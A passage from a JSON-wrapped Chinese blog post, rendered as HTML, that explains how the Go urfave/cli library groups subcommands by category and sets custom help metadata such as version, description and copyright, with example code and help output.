class-name\">help</span></pre></td></tr></table></figure><h2 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h2>\n<p>在子命令数量很多的时候，可以设置 <code>Category</code>  字段为它们分类，在帮助信息中会将相同分类的命令放在一起展示：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tapp <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tCommands<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Command<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t\tName<span class=\"token punctuation\">:</span> <span class=\"token string\">\"noop\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t\tName<span class=\"token punctuation\">:</span>     <span class=\"token string\">\"add\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t\tCategory<span class=\"token punctuation\">:</span> <span class=\"token string\">\"template\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\tUsage<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"Usage for add\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\tName<span class=\"token punctuation\">:</span>     <span class=\"token string\">\"remove\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\tCategory<span class=\"token punctuation\">:</span> <span class=\"token string\">\"template\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\tUsage<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"Usage for remove\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ go run main.go <span class=\"token parameter variable\">-h</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   main - A new cli application</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   main <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   noop     </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   help, h  Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   template:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>     <span class=\"token function\">add</span>     Usage <span class=\"token keyword\">for</span> <span class=\"token function\">add</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     remove  Usage <span class=\"token keyword\">for</span> remove</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>  show <span class=\"token builtin class-name\">help</span></pre></td></tr></table></figure><h1 id=\"自定义信息\"><a class=\"anchor\" href=\"#自定义信息\">#</a> 自定义信息</h1>\n<p>自定义 help 信息 包括版本 appName 等等</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> version <span class=\"token operator\">=</span> <span class=\"token string\">\"v0.0.1 development\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> appName <span class=\"token operator\">=</span> <span class=\"token string\">\"AliyunLogAnalysis\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> appAbout <span class=\"token operator\">=</span> <span class=\"token string\">\"Twelveeee\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">const</span> appDescription <span class=\"token operator\">=</span> <span class=\"token string\">\"日志分析\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> appCopyright <span class=\"token operator\">=</span> <span class=\"token string\">\"(c) 2023 Twelveeee @ Twelveeee\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// Metadata contains build specific information.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">var</span> Metadata <span class=\"token operator\">=</span> <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span>        appName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token string\">\"About\"</span><span class=\"token punctuation\">:</span>       appAbout<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> appDescription<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span>     version<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">defer</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> r <span class=\"token operator\">:=</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> r <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tapp <span class=\"token operator\">:=</span> cli<span class=\"token punctuation\">.</span><span class=\"token function\">NewApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Usage <span class=\"token operator\">=</span> appAbout</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Description <span class=\"token operator\">=</span> appDescription</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Version <span class=\"token operator\">=</span> version</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Copyright <span class=\"token operator\">=</span> appCopyright</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>EnableBashCompletion <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Flags <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>Flags<span class=\"token punctuation\">.</span><span class=\"token function\">Cli</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Commands <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span>Commands</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tapp<span class=\"token punctuation\">.</span>Metadata <span class=\"token operator\">=</span> Metadata</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token comment\">// app.UseShortOptionHandling = true</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"start app\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"run error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ go run main.go </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   main - Twelveeee</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   main <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>VERSION:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   v0.0.1 development</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>DESCRIPTION:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   日志分析</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   start, up      Starts the server</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   startDay, upd  Starts the server with start day and end day</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   help, h        Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>     show <span class=\"token builtin class-name\">help</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   --version, <span class=\"token parameter variable\">-v</span>  print the version</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>COPYRIGHT:</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   <span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token number\">2023</span> Twelveeee @ Twelveeee</pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "GO",
                "Lib",
                "GO",
                "Log"
            ]
        }
    ]
}